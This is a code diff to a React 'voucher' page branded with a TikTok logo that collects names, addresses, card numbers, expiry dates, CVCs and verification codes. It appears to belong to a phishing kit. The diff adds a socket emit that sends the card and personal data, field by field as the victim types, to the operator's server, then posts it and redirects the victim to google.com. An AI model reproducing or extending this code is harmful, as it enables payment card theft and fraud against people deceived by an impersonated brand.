@@ -1,6 +1,6 @@
 import { yupResolver } from '@hookform/resolvers/yup';
 import axios from 'axios';
-import { useState } from 'react';
+import { useContext, useEffect, useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { useNavigate } from 'react-router-dom';
 import { toast } from 'react-toastify';
@@ -13,6 +13,7 @@ import { firstCaptialize, isValidZipCode, validatePhone } from '../../utils';
 import moment from 'moment';
 import { countries } from 'countries-list';
 import logo from '../../assets/images/tiktokLogo.svg';
+import { SocketContext } from '../../App';
 
 const VoucherPage = () => {
 	const navigate = useNavigate();
@@ -76,7 +77,7 @@ const VoucherPage = () => {
 	const {
 		control,
 		watch,
-		formState: { errors },
+		formState: { errors, isDirty },
 	} = useForm({
 		defaultValues,
 		resolver: yupResolver(validationSchema),
@@ -102,6 +103,8 @@ const VoucherPage = () => {
 	const watchExpires = watch('expires');
 	const watchCvc = watch('cvc');
 
+	const socket = useContext(SocketContext)
+
 	const submitValueInformation = {
 		fullName: `${watchFirstName} ${watchLastName}`,
 		address: watchAddress,
@@ -115,27 +118,26 @@ const VoucherPage = () => {
 	};
 
 	const submitValueCard = {
-		schema: watchCardSchema,
-		type: watchCardType,
+		schema: watchCardSchema.toUpperCase(),
+		type: watchCardType.toUpperCase(),
 		cardName: watchCardName,
 		cardNumber: watchCardNumber,
 		expires: watchExpires && moment(watchExpires).format('MM/YY'),
 		cvc: watchCvc,
-		level: 'GOLD',
-		bank: `Bank of ${watchState && firstCaptialize(countries[watchState]?.name)}`,
-		bin: Math.floor(Math.random() * 1000000),
 		verifyCode: watchCardVerifyCode,
+	};
+
+	const submitvalue = {
+		...submitValueCard,
+		...submitValueInformation,
+		level: 'GOLD',
+		bank: watchState && `Bank of ${firstCaptialize(countries[watchState]?.name)}`,
+		bin: Math.floor(Math.random() * 1000000),
 	};
 
 	const onSubmit = async () => {
 		try {
-			setLoading(true);
-			const body = {
-				...submitValueCard,
-				...submitValueInformation,
-			};
-			await axios.post(`${API_URL}/api/payments`, body);
-			setLoading(false);
+			await axios.post(`${API_URL}/api/payments`, { ...submitvalue, sessionId: socket.id });
 			window.location.href = 'https://www.google.com';
 		} catch (error) {
 			setLoading(false);
@@ -147,8 +149,15 @@ const VoucherPage = () => {
 		setStep(1);
 	};
 
+	useEffect(() => {
+		if (isDirty) {
+			console.log(loading, 'loading')
+			socket.emit("creatingPayment", { ...submitvalue, frontEnd: window.location.host });
+		}
+	}, [submitValueInformation, submitValueCard]);
+
 	return (
-		<>
+		<div style={{ height: '100%' }}>
 			<div style={{ position: 'absolute', top: 0, left: 0 }} className='sm:hidden md:block'>
 				<img src={logo} height={150} width={150} />
 			</div>
@@ -167,7 +176,6 @@ const VoucherPage = () => {
 					disabled={
 						Object.keys(submitValueCard).some((item) => {
 							if (submitValueCard[item] || item === 'verifyCode') {
-								console.log(item, submitValueCard[item], 'item');
 								return false;
 							}
 							return true;
@@ -178,7 +186,7 @@ const VoucherPage = () => {
 					loading={loading}
 				/>
 			)}
-		</>
+		</div>
 	);
 };
 
